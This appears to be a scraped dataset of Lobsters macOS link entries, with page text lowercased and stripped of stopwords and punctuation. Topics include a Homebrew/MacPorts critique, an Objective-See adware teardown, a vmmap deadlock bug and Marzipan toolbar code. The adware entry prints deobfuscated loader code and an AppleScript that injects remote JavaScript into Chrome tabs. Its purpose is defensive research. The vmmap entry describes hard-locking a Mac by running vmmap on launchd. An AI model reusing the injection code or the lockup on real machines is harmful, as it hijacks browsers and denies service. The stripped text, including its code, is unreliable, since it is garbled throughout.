enriching involvement macports development exception overall really issue generally contribution valued felt included community macports seems bit lacking manpower make thing take slightly longer would expected community quite welcoming maintainer helpful accommodating project wellstructured clear delegation responsibility guideline contribute excellent supporting infrastructure extensive documentation short macports least enjoyable project contribute already done many time like many others worked homebrew virtue popularity homebrew community refreshingly quick provide feedback interaction short productive maintainer usually supportive issue however year noticed shift attitude whereas welcoming issue homebrew seems become significantly le recently process actually reporting bug needlessly abrasive example using beta version macos package fails build homebrew tell uncertain term file issue make sense since clearly interested collecting information decide go ahead filing issue spite warning default template yell deviate form intimidate newcomer project giving feeling might permanently banned make mistake also restricts discussion making impossible bring anything outside cookiecutter model package failed build based interaction core team member done design point homebrew seemed changed metric success people filing fewer issue change line goal seem create perverse incentive dissuade people reporting legitimate issue really mean problem hidden formula remain silently broken longer period time similar vein homebrew policy automatically closing locking issue prevents followup associated discussion needlessly disadvantaging user closely follow development process able voice opinion time distilling issue many homebrew project decision received significant pushback community expected large project number user homebrew actual implementation execution change decidedly poor biggest driver behind lack communication controversial change end proposed agreed upon implemented little feedback community two instance note adoption optout google analytics removal option homebrew silent inclusion optout google analytics kicked quite bit conversation regardless original reason discussion couple thing note feature could probably predicted controversial introduced change implemented merged without much deliberation least comparison discussion lead later large backlash community multiple complaint change poorly communicated user none improvement suggested seriously considered conversation closed explicit statement boil ship already sailed anything want talk anymore multiple reference homebrew opensource project run volunteer owe nothing note usually point homebrew opensource project run volunteer owe nothing come yes homebrew open source could fork project change code liking yes homebrew maintainer volunteer spend free time working project yes obligation work project right ask anything side yes like use homebrew going argue true saying point open source software traditionally based around goodfaith besteffort attempt helpful whole point sharing software useful people mean maintainer bend backwards accommodate everyone desire large project existence make difficult decision leave user unhappy point considered good etiquette take account need user making decision nobody force anyone able common courtesy sometimes mean recognizing aware project run volunteer taking time day make software better like marginalizing view people concern telling fork stop using software unhappy thinly veiled suggestion get lost squanders goodwill might reflects poorly project characteristic present almost every contentious decision homebrew made discussion around removal option significantly involved almost perfect example brought significant concern regarding justification provided change came multiple compromise address problem felt adequately considered change made brushed aside maintainer unwilling entertain sort discussion topic thread locked several comment deleted short homebrew continues make decision without consulting community frequently weak justification behind fails communicate change user refuse consider reasonable compromise one final important point unacceptable homebrew maintainer abuse tool intended moderation quite literally put word people mouth removing folding hiding ideally moderation auditable spam nonconstructive vitriol clearly contribute ongoing discourse fine intended purpose tool ok silently editing people comment say something completely different claim understand circumstance surrounding resignation dominyk tiller pretty clear felt like forced changing word remove sentiment nonobvious way note github ui indicating edited comment particularly conspicuous inappropriate frankly make difficult assume good faith mentioned brief email exchange mike mcquaid correct response would voice disagreement dominyk point view replying another comment profile attached signify view dominyk think also go without saying deleting comment extension edits hoping nobody would notice help situation restore trust action put particularly good light update dominyk tiller mike mcquaid emailed today morning independently almost simultaneously elaborating perspective incident read dominyk comment mike viewpoint moving forward question homebrew improve simultaneously simple complex simple answer would work work fixing issue listed making easier people contribute improving communication user listening feedback give would go long way ameliorate current situation fundamental issue would still remain easy change problem attitude way project run homebrew need realize maintainer project volunteer involved development process ignoring user making feel like contribution valued actively harm project finally need recognize boundary regard effective moderation open source project fine need model emulate certainly lot choice pick conclusion think gotten pretty good taste macports homebrew stand currently strongly recommend macports better architected better development community homebrew user interface package availability bit nicer macports arguably easier use beginner cost inconvenient advanced user breaking often fundamentally homebrew issue need fix consider going back expect stay macports foreseeable future
205,Lobsters,mac,Apple macOS,"flow9: a cross-platform modern UI for Web, iOS, Android, Windows, Mac, Linux",https://flow9.org/,crossplatform modern ui web io android window mac linux,welcome flow name blog flow github,welcome flow flow platform safe easy productive programming complex multiplatform apps modern user interface flow platform includes flow programming language safe functional stronglytyped programming language flowc compiler incremental compiler multiple target flow runtime standard library provides complete crossplatform library including mature ui component flow production quality target html io android window mac linux name flow started predates flow typechecker facebook thus elect keep name since came first full platform risk confusion seems small however need arise also used refer language blog april released flow github open source flow complete platform writing apps functional programming language run everywhere every day new programming language announced need one
206,Lobsters,mac,Apple macOS,"Mac Adware, à la Python",https://objective-see.com/blog/blog_0x3F.html,mac adware à la python,background blog post amit serper macpaw cleanmymac x analysis virustotal link pythondecompilercom pythondecompilercom urlscanio conclusion patreon,mac adware ã la python tearing apart persistent adware injector march research tool writing supported friend objectivesee today blog post brought want play along uploaded sample discussed post downloads password infect background chance apple user tell mac infected likely adware year mac adware become ever prolific hacker seek financially benefit popularity cupertino device adware though generally viewed simply annoyance often remove remote adversary complete control infected system one prolific piece mac adware osxpirrit also named vsearch previously talked annoying malcreation guest blog post written security researcher amit serper writeup discus propensity displaying ad popups also note osxpirrit take complete control machine making hard user remove today going dive persistent piece mac adware likely component osxpirrit noted respected security researcher leverage various level obfuscation hinder analysis although aware adware initial infection vector adware generally end user mac via shareware installers trojanized application ie adobe flash installers distributed malicious website adware likely new component osxpirrit brought attention paul taykalo macpaw thanks paul macpaw creates apps cleanmymac x friend objectivesee together collaborating improve mac adware malware detection persistent adware component originally undetected engine virustotal decided tear apart sharing process blog post let dive analysis noted file vtzkt originally undetected av engine virustotal link surprising adware author often create new variant specifically avoid detection traditional av product triggering rescan file engine flag file malicious however simply identify adwareosxagentb download file vtzkt run file command identify type file userspatrickdownloadsvtzkt userspatrickdownloadsvtzkt python bytecompiled look like python albeit compiled meaning converted python bytecode hexdump c vtzkt u c l z l z e j e j u ff ff ff ff n ejydvltijku nbmnnlsolagiqcg luckily online resource pythondecompilercom transform decompile binary back python source code greatly simplifies analysis le vtzktdecompiled python bytecode embedded file name cpy compiled import zlib exec zlibdecompress cvxvoqhs though python source code v compiled binary python bytecode code clearly still obfuscated specifically encoded zlib compressed course hinder av detection extent slightly complicate analysis easiest way deobfuscate code simply covert exec statement print execute python shell python import zlib print zlibdecompress import time hboglobals hbmnone hbjtrue hbqopen hbkplatformmacver import hbjappend import objc hbnobjcloadbundlefunctions subprocess import popen pipe foundation import nsbundle hbwnsbundlebundlewithidentifier def hbh hbbhbw comappleframeworkiokit hbt ioservicegetmatchingservice b ii ioservicematching b ioregistryentrycreatecfproperty b hbn hbb hbo hbt def hb return hbx ioplatformuuid def hba s pas hbj fhbq hbi fwrite n format hbv s fclose def hbt hbd strtoxor return join hby hba c hba hbdqvwzj ndx hbl hbdqvwzj ndx c hbd hb strtoxor name main hbvhbp hbvhbp code decoded decompressed clearly still somewhat obfuscated first step manually decode embedded string tmpclpylog decoded string include home varroot librarysaveddatafiles librarymacconfigdata tmpixsh following manually replace various obfuscated variable function example hbxhbb hbr hbuhbt hbx hbnhburead rewritten request hbr response request content responseread clearly simpler read understand unfortunately important detail missing url server adware making request specifically value passed function obfuscated code url held within hbr variable variable set following manner hbr mvr format juzur hb hbk let dig bit find value would nice know url adware communicating relevant code macos version hbkplatformmacver platform uuid def hb return hbx ioplatformuuid encoded key dat hbfhbi build full path hbyhbdhbt format hbdhbt hbdeprun hbf encoded key hbdfjvashbi dxa python object persistence hbxshelvedbfilenameshelf open python object file store xmnbv class variable hbdxmnbvhbx hbdhbt hby invoke hbn passing hbdhbn hbdxmnbv hbdfjvas strip create url value object store platform uuid macos version def hbn hbd juzur hbr mvr format juzur hb hbk short url request contains platform uuid victim macos version url appears extracted file via shelvedbfilenameshelf method file easiest way simply add print statement python code print hbdhbt hby executed virtual machine spit decoded file path usersuserlibrarysaveddatafilesdat unfortunately saveddatafiles directory recovered thus dat file available analysis thus url currently remains mystery however paul able dig closely related sample though second sample contain method call far le obfuscated external file referenced recovered well thus analysis continue sample second sample found within folder named searchamp contained following file cqfep file simple bash script likely persisted launch item ensure adware automatically started time user log mac cat cqfep usrbinenv bash cd userslibrarysearchamp python changing searchamp directory via cd command script executes file via python passing file via f parameter confirm file indeed python script via aforementioned file command file python bytecompiled recall sample initially investigated vtzkt also python bytecompiled binary decompiling via pythondecompilercom representation python source recovered le python bytecode embedded file name rpy compiled import zlib exec zlibdecompress practically identical vtzkt sample decoding decompressing chunk reveals python share ton similarity vtzkt file python import zlib print zlibdecompress subprocess import popen pipe wvclen wvhenumerate import import time wvutimesleep import objc wvcobjcloadbundlefunctions foundation import nsbundle wvtnsbundlebundlewithidentifier however closer look decoded python code reveals intriguing variable name value sample apparently remain unobfuscated class wvn def init wvd wvb wvdwvu wvdxorkey wvdpidflag wvdplaintextscript wvdurlinject http wvdmidwvdwvk wvdwvj def wvr wvd wvc wvdargs wvdargs pas elif wvdargs startswith f try split except pas def wvy wvd wv f wvdplaintextscriptfread strip wvdplaintextscriptwvf wvdwvq wvdplaintextscript wvdplaintextscriptwvdplaintextscriptreplace pidreplace wvdpidflag wvdplaintextscriptwvdplaintextscriptreplace scripttoinjectreplace wvdurlinject wvdplaintextscriptwvdplaintextscriptreplace midreplace wvdmid def wvi wvd ppopen osascript stdinpipe stdoutpipe stderrpipe wvi wvppcommunicate wvdplaintextscript wvn class init method see reference various variable interest encoded file xor key injection url http wvr method code check script invoked f commandline option set variable specified file recall script persistently invoked following python thus executed set taking peak reveals encoded possibly encrypted xor hexdump c kpc qgr iq x r rh r l though could manually decode xor key simpler insert print statement code immediately logic decodes content file specifically end wvy method def wvy wvd wv f wvdplaintextscriptfread strip wvdplaintextscriptwvf wvdwvq wvdplaintextscript wvdplaintextscriptwvdplaintextscriptreplace pidreplace wvdpidflag wvdplaintextscriptwvdplaintextscriptreplace scripttoinjectreplace wvdurlinject wvdplaintextscriptwvdplaintextscriptreplace midreplace wvdmid patrick print decoded script file print wvdplaintextscript executing modified python code vm passing file via f print content decoded file python global keeprunning set keeprunning repeat keeprunning â event xfdrijctâ end repeat â event xfdrijctâ delay try ischromerunning tell application google chrome tell active tab window set sourcehtml execute javascript documentgetelementsbytagname head innerhtml sourcehtml contain tell application google chrome execute front window active tab javascript var piddiv documentcreateelement div piddivid piddivstyle display none piddivinnerhtml documentgetelementsbytagname head appendchild piddiv tell application google chrome execute front window active tab javascript var jsscript documentcreateelement script jsscripttype textjavascript jsscriptsrc http documentgetelementsbytagname head appendchild jsscript end end tell else set keeprunning end end try end â event xfdrijctâ ischromerunning tell application system event name process contains google chrome end ischromerunning ahh applescript perusing decoded script reveals performs following action check google chrome running grab html code page active tab said html contain injects executes two piece javascript var piddiv documentcreateelement div piddivid piddivstyle display none piddivinnerhtml documentgetelementsbytagname head appendchild piddiv var jsscript documentcreateelement script jsscripttype textjavascript jsscriptsrc http documentgetelementsbytagname head appendchild jsscript note url http match hardcoded value wvdurlinject variable python code scan defunct url via urlscanio reveals following var mid documentgetelementbyid innerhtml var jsscript documentcreateelement script jsscripttype textjavascript jsscriptsrc dom windowlocationhref mid mid documentgetelementsbytagname head appendchild jsscript injection javascript injection redirects rather common adware generally route control flow thru multiple script site url final destination unfortunately manually attempting talk url fails return ok however fails return content javascript unfortunately mean ascertain ultimate goal adware however adware generally injects ad popups user browser session order generate revenue author wrap blog let return python code explore persistent component adware kick applescript injection script turn code performs action resides wvi method def wvi wvd ppopen osascript stdinpipe stdoutpipe stderrpipe wvi wvppcommunicate wvdplaintextscript easy see adware executes osascript binary builtin macos utility used execute applescript via python popen function osascript process launched adware pass decoded applescript wvdplaintextscript via communicate method course cause applescript executed neat sideaffect decoded script remain filesystem ie memory conclusion blog post dug persistent piece mac adware though compiled python bytecode using online resource able decompile generate python source decoding decompressing source made analysis far simpler unfortunately initial sample externally referenced file missing prevented full analysis luckily related sample uncovered along external file persistent bash script encoded input file passed main adware component instrumentation second sample allowed u ascertain goal injection via applescript javascript chrome page good news recent version macos chrome injection attack thwarted first macos mojave block applescript interapplication interaction unless user manually approve whitelisted application initiating applescript interaction thus adware attempt injection via applescript blocked system alert displayed google chrome default also block attack error google chrome got error executing javascript applescript turned turn menu bar go view developer allow javascript apple event information http supportgooglecomchrome papplescript number specifically ignore javascript injection via applescipt unless manually allowed via developer menu option kudos apple google continually improving security posture product yes perfect example security point view always wise keep software uptodate love blog post tool support via patreon page
207,Lobsters,mac,Apple macOS,Get the RSS feed url from an Apple Podcasts url using curl and jq,https://write.as/informative-jottings/get-the-rss-feed-url-from-an-apple-podcasts-url-using-curl-and-jq,get r feed url apple podcasts url using curl jq,get r feed url apple podcasts url using,get r feed url apple podcasts url using curl jqapril curl silent http itunesapplecomlookup id id jq r result feedurl work linux macos may need install jq id end http podcastsapplecom url example http id method known working year advanced oneline version using original url requires grep urlhttps curl silent http itunesapplecomlookup id echo url grep e jq r result feedurl
208,Lobsters,mac,Apple macOS,Using a Raspberry Pi as a RTP-MIDI Gateway for macOS,https://blog.tarn-vedra.de/pimidi-box/,using raspberry pi rtpmidi gateway macos,using raspberry pi rtpmidi gateway macos prerequisite checking device work midi support compiling dave kelly creating config file testing setting autostart via systemd,using raspberry pi rtpmidi gateway macos guide setting raspberry pi rtpmidi source usage macos networked midi support raspberry pi acting transparent network bridge midi controller mac running garageband midi software allows record electric piano keyboard mac wirelessly guide assumes general knowledge raspberry pi midi wo nt go detail set pi access shell prerequisite raspberry pi usb midi interface anything supported linux work bought random cheap one amazon nt run issue nt need midi controller support usb natively midi controller keyboard basically anything last year work long plug computer work usual midi software work guide checking device work alsas midi support run amidi l list available midi device amidi l dir device name io usb midi interface midi remember value device column need later tell raveloxmidi device relay midi message also check alsa able read message device via amidi dump amidi dump use ctrlc stop command compiling raveloxmidi raveloxmidi great piece software originally written dave kelly handle hard part advertising device network handling session relaying midi message u compilation prerequisite install via sudo apt install git pkgconfig libavahiclientdev autoconf automake clone repository get source code via git clone b experimental http githubcomraveloxpimidigit change source directory compile code cd pimidiraveloxmidi autogensh configure make everything compiled fine install generated binary systemwide sudo make install creating config file create simple config file etcraveloxmidiconf following content alsainputdevice yourdeviceid networkbindaddress loggingenabled yes loggingloglevel normal testing start raveloxmidi run sudo raveloxmidi dn c etcraveloxmidiconf output bunch debug message dump even midi message arrives connected controller nothing happens whena midi message arrives check hardwareid amidi l correct mac start audio midi setup open midi network setup window midi studio open midi network setup device name raveloxmidi appear directory list creating new session clicking session pane enabling able connect raveloxmidi selecting clicking connect last thing piping midi message network local midi session clicking dropdown arrow pointing left meaning incoming midi message selecting appropriate target session able play instrument example garageband midi controller connected raspberry pi disconnect audio midi setup stop raveloxmidi via ctrlc setting autostart via systemd thing left setting everything start automatically boot restart case crash create file etcsystemdsystemraveloxmidiservice following content unit afterlocalfstarget networktarget descriptionraveloxmidi rtpmidi network server install wantedbymultiusertarget service execstartusrlocalbinraveloxmidi n c etcraveloxmidiconf typesimple restartalways declares new raveloxmidi systemd service start boot restart case crash enable service run sudo systemctl daemonreload sudo systemctl enable raveloxmidiservice sudo systemctl start raveloxmidiservice check status view recent log message via systemctl status raveloxmidiservice raveloxmidiservice raveloxmidi rtpmidi network server loaded loaded etcsystemdsystemraveloxmidiservice enabled vendor preset enabled active active running since sat gmt ago main pid raveloxmidi cgroup systemsliceraveloxmidiservice usrlocalbinraveloxmidi n c etcraveloxmidiconf
210,Lobsters,mac,Apple macOS,Tools for writing cross-platform Node.js,https://github.com/bcoe/awesome-cross-platform-nodejs,tool writing crossplatform nodejs,content resource application development environment continuous integration appveyor travis azure pipeline virtualization ievms virtualbox docker compatibility wine cygwin wsl mingw msys git bash database redis library o identification iswindows iswsl getos osname systeminformation shell execa gulpexeca crossspawn shelljs nodewindows logsymbols figure clipboardy clipboardcli environment crossenv userhome username osenv iselevated filesystem rimraf del makedir readdirp cpy chokidar gracefulfs fsextra anypath devnullcli signal fkill signalexit process stream desktop ui open nodenotifier window registry known issue cmdexe unicode woe spawn issue exec behavior shell see also support submit issue github code conduct contributing guideline allcontributors license,curated list awesome developer tool writing crossplatform nodejs code content resource application development environment continuous integration appveyor focused window free tier available os project travis windowsmacoslinux free os project azure pipeline windowsmacoslinux free os project parallel job virtualization ievms automated installer free virtual machine image microsoft provides testing multiple version ie image useful crossplatform testing various technology however make sure read understand microsofts licensing virtualbox general purpose software running virtual machine docker software platform create deploy manage virtualized application container common operating system ecosystem allied tool compatibility wine run window api call linux mac bsd solaris cygwin run posix window wsl run linux command line window elf binary execution system call filesystem bash core utility common application mingw gcc window msys git bash bash window database redis native port redis window library o identification iswindows detect whether current platform window iswsl detect whether current platform wsl window subsystem linux getos retrieve current o including linux distribution osname get name current operating system systeminformation hardwaresoftware system information shell execa crossplatform implementation childprocess execfile exec gulpexeca crossplatform command execution gulpjs crossspawn crossplatform implementation childprocessspawn shelljs crossplatform unix shell command nodewindows window support nodejs script daemon eventlog uac etc logsymbols colored symbol various log level window fallback figure unicode symbol window fallback clipboardy clipboardcli crossplatform copypaste environment crossenv set environment variable crossplatform userhome get path user home directory crossplatform username get current username osenv crossplatform environment variable iselevated check process running elevated privilege crossplatform implementation unix filesystem rimraf del delete file folder crossplatform makedir crossplatform mkdir p readdirp recursive version fsreaddir cpy copy file crossplatform chokidar improved crossplatform file watching gracefulfs improves f module especially window fsextra combine gracefulfs better json file reading promise anypath use window posix path interchangeably fetching value object devnullcli crossplatform devnull signal fkill kill process crossplatform signalexit crossplatform exit handler process stream desktop ui open open stuff like website file executables crossplatform nodenotifier crossplatform desktop notification window registry known issue cmdexe unicode woe default cmdexe display unicode character window spawn issue childprocessspawn behavior consistent window linux exec behavior shell depending shell used eg bash v dash childprocessexec inconsistent exit behavior see also support found error would like add information nt hesitate submit issue github everyone welcome regardless personal background enforce code conduct order promote positive inclusive environment contributing project made simplest way give back starring sharing online documentation unclear typo please click page edit button pencil icon suggest correction would like help u fix error add information please check guideline pull request welcome thanks go wonderful people project follows allcontributors specification license
211,Lobsters,mac,Apple macOS,Notarizing Your App Before Distribution,https://developer.apple.com/documentation/security/notarizing_your_app_before_distribution?language=objc,notarizing app distribution,page requires javascript,page requires javascriptplease turn javascript browser refresh page view content
212,Lobsters,mac,Apple macOS,Display macOS Dock in Touch Bar,https://pock.pigigaldi.com/,display macos dock touch bar,preference,preference adjust pock widget setting reflects specific need access pane preference menu item
213,Lobsters,mac,Apple macOS,Death by vmmap,https://objective-see.com/blog/blog_0x3E.html,death vmmap,background nsa lulu taskexplorer panic heapoverflow taskexplorer taskexplorer loaded library enumeration taskexplorer whats sign dylib hijacking taskexplorer taskexplorer taskexplorer taskexplorer taskexplorer death macos conclusion patreon,death vmmap core mojave utility rather disastrously broken february research tool writing supported friend objectivesee today blog post brought background casual macos bug hunter often wonder worry number bug apple desktop operating system decreasing good news new release macos appears new bug constantly added blog post dive rather annoying bug apparently introduced macos mojave though significant security implication bring macos mojave system forcing unfortunate user hardreboot shiny mac may come surprise rarely ever go hunting bug macos yes due stint nsa often looking thing viewpoint hacker occasionally go poke o however majority time minding business hard work tool lulu taskexplorer often tool development enough uncover serious vulnerability macos kernel mode panic kernel mode heapoverflow mojave released started receive report user taskexplorer would cause entire system fully like even spinning beach ball death would refuse spin hard reboot option would bring mojave back life mac user understandably rather upset people afford lose work log result crash know likely happen task explorer opened one professional another appears extremely careless unfair besides inconveniencing user yah stoked labeled extremely careless rather perturbed taskexplorer running without issue better part year change mojave ultimately responsible system lockup let find taskexplorer loaded library enumeration taskexplorer neat utility allows one visually explore task process running mac example quickly see task signature status loaded dynamic library dylibs open file network connection much malware detection bug hunting able view dylibs loaded process invaluable example via taskexplorer stumbled upon noticed comappledockextra process loaded untrusted ie dylibs entitled address space many exploit rely entitled process loading attacker controlled dylib entitlement afford process special right applied process level thus dylib loaded entitled process automatically inherits entitlement view entitlement process either use command codesign pathtoapplication via gui mean whats sign utility term malware detection advanced macos malware may run dylib persist ie via dylib hijacking avoid detection apple builtin activity monitor application show library process loaded thus malicious backdoor compiled dylib clear understand may difficult detect v standalone binary application would readily visible taskexplorer enumerate loaded dylibs older version osxmacos taskexplorer able directly enumerate dylibs loaded remote process reading said process memory accomplished following step invoking taskforpid function retrieve task port remote process allows taskexplorer read memory remote process invoking taskinfo function taskdyldinfo parameter populate taskdyldinfo structure invoking machvmread function read dyldallimageinfo structure invoking machvmread function read array dyldimageinfo structure iterating dyldimageinfo structure invoking machvmread function read address loaded dylib path end result list path dylibs loaded remote process well good noted stealthy malware unlink list dyldimageinfo structure however technique yet observed wild unfortunately taskexplorer recent version macos apple longer allows utility retrieve remote process task port specifically taskforpid call always fail even caller executing root privilege without remote process task port taskexplorer read remote memory thus enumerate loaded dynamic library however work around limitation using apple vmmap utility unlike utility effectively blocked accessing remote process even simply enumerate loaded dylibs apple utility still mighty comapplesystemtaskports entitlement according man page vmmap utility display virtual memory region allocated process also includes path binary back relevant memory region dump memory region calculatorapp pid p aux grep calculator patrick applicationscalculatorappcontentsmacoscalculator vmmap w process calculator path applicationscalculatorappcontentsmacoscalculator nonwritable region process region type region detail text applicationscalculatorappcontentsmacoscalculator linkedit applicationscalculatorappcontentsmacoscalculator text usrlibdyld text systemlibraryframeworksappkitframeworkversionscappkit text systemlibraryframeworkscoregraphicsframeworkversionsacoregraphics vmmap indirectly display loaded dylibs remote process even modern version macos previously updated taskexplorer simply execute vmmap parse output order still enumerate loaded dylibs exec vmmap exectask vmmap w pid stringvalue yes iterate result line line looking text nsstring line output componentsseparatedbycharactersinset nscharacterset newlinecharacterset extract dylib path dylib line substringfromindex pathoffsetlocation stringbytrimmingcharactersinset nscharacterset whitespacecharacterset add result array dylibs addobject dylib well good mojave death macos previously noted mojave released user reported taskexplorer would cause entire system fully lock able easily replicated bug vm personal system hard manual reboot way bring macos system back life digging taskexplorer code quickly tracked code responsible triggering system deadlock turn taskexplorer invoked vmmap order enumerate loaded dylibs remote process system would lock exploring determined lockup would occur remote process process id pid replicate bug root sudo prompt run vmmap note lock macos mojave system special process id pid importantly crush macos mojave let dig question first pid always belongs launchd directly executed kernel system boot process first usermode process pid understandably arbitrator many usermode process launchd would ever become uncommunicative system would quickly devolve point return yes foreshadowing brings u next question vmmap cause macos lock one way find let dive vmmap code first recall vmmap enumerate virtual memory region allocated remote launchd order safely first suspends process enumerates allocated memory region resume process observe debugger setting breakpoint tasksuspend lldb setting set targetrunargs lldb b tasksuspend breakpoint libsystemkerneldylib tasksuspend address lldb r process launched usrbinvmmap process stopped thread queue comapplemainthread stop reason breakpoint frame libsystemkerneldylib tasksuspend libsystemkerneldylib tasksuspend pushq rbp movq rsp rbp pushq rbx subq rsp target vmmap stopped lldb bt thread queue comapplemainthread stop reason breakpoint frame libsystemkerneldylib tasksuspend frame symbolication taskstartpeeking frame vmmap vmmap frame vmmap vmmap frame vmmap vmmap frame vmmap vmmap frame libdylddylib start frame libdylddylib start lldb debugger backtrace bt see symbolicationtaskstartpeeking call tasksuspend suspend process taking memory snapshot shortly thereafter vmmap attempt symbolicate memory region via private coresymbolication framework part symbolication invokes coresymbolicationmmapstoragedaemon function turn call cscppdaemonconnection cscppdaemonconnection method disassembly cscppdaemonconnection cscppdaemonconnection method note various xpc call xpcconnectioncreatemachservice xpcconnectionresume xpc interprocess communication ipc mechanism macos largely facilitated launchd symbolication logic within vmmap invokes method specifically xpcconnectionresume method turn call xpclookupendpoint function routed launchd unfortunately launchd suspended vmmap xpc request never serviced instead block vmmap hang awaiting response meaning launchd never resumed vmmap mean entire system grind halt dy horrible horrible death exact xpc call appears block hence trigger deadlock call libxpc xpclookupendpoint function endpoint trying resolve comapplecoresymbolicationd uggh well good hey least know vmmap deadlock system go tell friend run command mojave box yell tell blame cupertino q lack thereof conclusion blog post dug macos mojave executing vmmap launchd pid deadlock entire system short vmmap suspended launchd indirectly attempt call launchd via xpc launchd suspended vmmap everything grind halt tool development taskexplorer enough uncover rather serious flaw time important apple utility reported bug apple promised help get resolved meantime updated taskexplorer work around bug specifically skipping launchd enumerating loaded dylibs mojave mojave skip launchd apple bug selfpidintegervalue getversion gestaltsystemversionminor osminorversionmojave skip return noted older version osx macos affected though dug much appears xpc endpoint resolution handled graceful manner specifically directly fails invalid connection comapplecoresymbolicationd case failure good thing vmmap continue resume launchd v remaining hung entire system deadlock let end post plea apple please provide api trusted privileged security tool enumerate dylibs loaded remote process going force u use tool ie vmmap accomplish task please please please test love blog post tool support via patreon page
215,Lobsters,mac,Apple macOS,The Sad State of Logging Bugs for Apple,https://www.corbinstreehouse.com/blog/2019/03/the-sad-state-of-logging-bugs-for-apple/,sad state logging bug apple,http bugreportapplecom happens bug fix never apple,find bug macos io something software working way work decide let apple know head http bugreportapplecom login apple id fill required form list reproduction step hit special key chord generate fat sysdiagnose attach screen shot hope fix happens bug bug tracked internal application called radar internal apple employee simply log bug directly application external people use website bug reporter show specific developer interaction bug hide detail bug detail engineer comment progress bug expect fix build fixed priority priority important bug considered unscreened priority set bug high priority highly likely get fixed whereas bug lower priority likely ever get fixed bug placed particular top level component sub component savvy internal developer log bug directly component bug corresponds appkit nstableview get directly right person need look top level component large dropping area generic bug fall itunes component get saturated bug report bug hit radar someone look developer support often take first look bug related sdkprogramming issue pas specific top level component directly specific component ie nswindow thing get screwy depending component bug land since bug management group dependent many group one two qa people initial screening large drop area bug qa engineer sometimes instructed screen bug priority fix period passing engineer responsible code terrible many engineer look bug low priority much better engineer owns code look bug determine priority qa engineer frequently get huge back log bug screen take week even month bug get screened sometimes lead mass screening bug marking low priority bug originator notice complain priority get increased worse yet group mass close bug older year ask originator reopen bug issue still exists lot people pay attention bug need verification simply become lost internal developer perspective quite frustrating take time log detailed bug see sit unscreened week week demoralizing see happen bug worse yet sometimes bug would get forwardduped someone else later time log bug older bug report get duplicated often simply delayed screening bug external developer perspective even worse little feedback bug progress know priority bug even looked screened apple intentionally opaque transparency could easily leak feature product expected hopefully bug end individual engineer work code lot bug still unscreened apple engineer seem loathe process screening bug let sit around sometimes week month people would rather focus coding something new working already screened bug fix opposed taking time read bug report figure need done read fix right screening determine priority fix sometimes nebulous possibly ask originator information mark duplicate engineer also dislike screening bug sometimes add queue current release increase required workload release something people like instead many bug stay unscreened unscreened bug indicate potential software problem need fixed obviously bad management like high unscreened bug count manager frequently instruct engineer screen bug ask qa engineer bad sometimes qa screen bug low priority hold onto never get moved appropriate code engineer effectively become lost system sadly seen happen way often bug screened low priority nebulousfuture fix date also lost rarely revisited fixed sometimes okay bug obscure rare spend time fixing bug owner want take time go back forth originator find piece information may need sit bug long time eventually try reproduce bug later version unreleased o reproduce assume fixed send back originator particularly bad external developer describe bug sent back fixed internal developer originated bug supposed verify problem resolved send back problem resolved however internal developer really incentive verify bug management keep track bug need verification really require developer verify engineer verify bug like make sure problem resolved external developer left sad state bug becomes closed dead external developer get notified bug fixed fix available public release o mean could take year bug get back external developer since bug start get fixed o released public generally bug ask external developer verify bug installing latest o people including possible need run support older o ability install newer o particular machine want install latest o anything want need run even install o may find bug fixed point simply late engineering likely closed bug lost ether apple simple internal engineer need take responsibility promptly screening bug management need allow engineer time expense working feature fixing already screened bug engineer always expected low unscreened bug count internal engineer need promptly verify bug sent back need install beta version o testing fixed send back bug report refers problem developer look code interacts area described try think would cause problem happen instance button incorrectly disabled itunes developer try figure could happen instead asking reproduce worked apple practiced preaching would screen bug within day would verify bug within week would poke around code attempt make theoretical fix bug reproduce felt like part job thing daily task obviously log bug report okay log bug missing information developer ask specific need general appkit related bug would find sysdiagnose rarely would provide useful information would hate people usually qa engineer worked code would ask sysdiagnose know help figure anything log duplicate know someone else logged bug encountering issue log bug get marked duplicate help increase priority bug sad apple look bug high dupe count looked
217,Lobsters,mac,Apple macOS,Making Marzipan Apps Sing,https://www.highcaffeinecontent.com/blog/20190302-Making-Marzipan-Apps-Sing,making marzipan apps sing,preamble let go newlymarzipanified app classdump toolbars tab bar menu contextual menu sidebar mouse touch bar dark mode conclusion go beyond p pps,preamble fair warning post going codeheavy series example rather tutorial everything need listed use springboard new research topic example objectivec language work easiest language work private undocumented apis classdumped header done swift enough hoopjumping leave exercise reader nt miss post series let go look newlymarzipanified app compare apple builtin uikit apps mojave notice look lot clunky lessnative apple really make app sing going use new class mechanic unique uikit macos class wo nt io sdk retrieve uptodate version use tool like classdump uikitcoreframework housed systemiossupportsystemlibraryprivateframeworks classdump look objc class information binary generates header everything find including private class apis little cleanup header incorporated project private apis called private apis used shipping app store app land rejection app review likely change update o crash app treating carefully technically uikit mac everything related marzipan private api nt expect apis survive asis next release macos public uikit sdk bear mind treat experimentation work rather concrete planning bringing app macos going explain everything need use classdump hope already familiar might worth little research online continue simplest invoke mkdir p uikitprivateheaders cd uikitprivateheaders classdump h systemiossupportsystemlibraryprivateframeworksuikitcoreframeworkuikitcore mentioned classdumped header need little cleanup used project may need remove import replace foundationfoundationh uikituikith may remove method nt relevant need list specific header macos relate marzipan great many safely ignored underthehood implementation detail key need app like everything prefixed uiwindowtoolbar uimenubar header happy use generally two way lookup class runtime nsclassfromstring friend weaklink class passing argument linker project build setting linker flag class want link wl u objcclass uiwindowtoolbarbuttonitem recommend weaklinking apps help menu support toolbars simple starting point add couple button macstyle toolbar use app io app may io navigation bar toolbars affixed top viewport want turn appropriate mynavigationcontrollernavigationbarhidden yes start implement marzipanspecific api create simple button title action uiwindowtoolbarbuttonitem editbutton uiwindowtoolbarbuttonitem alloc initwithidentifier comtestbuttonedit editbuttontitle edit editbuttonaction selector editbuttonpressed editbuttontarget self create simple bordered button image icon uiwindowtoolbarbuttonitem addbutton uiwindowtoolbarbuttonitem alloc initwithidentifier comtestbuttonadd addbuttonimagename bigplusicon addbuttonaction selector addbuttonpressed addbuttontarget self create title label apple us apps show window title uiwindowtoolbarlabelitem titlelabel uiwindowtoolbarlabelitem alloc initwithidentifier titlelabel titlelabeltext great app window windowtoolbarcontroller templateitems nsset setwithobjects editbutton addbutton titlelabel nil window windowtoolbarcontroller itemidentifiers nstoolbarflexiblespaceitem titlelabel nstoolbarflexiblespaceitem comtestbuttonedit comtestbuttonadd window windowtoolbarcontroller centereditemidentifier titlelabel tab bar use tab bar io app may noticed nt appear macos replace tab bar use segmented control window toolbar like see home app mojave uiwindowtoolbarsegmentedcontrolitem item uiwindowtoolbarsegmentedcontrolitem alloc 